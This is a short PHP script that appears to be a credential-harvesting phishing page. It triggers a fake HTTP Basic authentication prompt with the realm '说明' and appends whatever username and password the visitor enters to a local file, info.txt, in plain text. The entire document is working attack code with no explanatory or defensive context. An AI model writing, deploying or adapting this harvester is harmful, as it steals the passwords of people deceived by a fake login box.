<?php
$info='说明';
$file="info.txt";
if(!isset($_SERVER['PHP_AUTH_USER']) or !isset($_SERVER['PHP_AUTH_PW'])){
header('WWW-Authenticate: Basic Realm="'.$info.'"');
header("HTTP/1.1 401 Unauthorized");
}
else {
$aa="username:".$_SERVER['PHP_AUTH_USER']." | password:".$_SERVER['PHP_AUTH_PW'];
$fp=fopen($file,'a');
fwrite($fp,$aa);
fclose($fp);
}
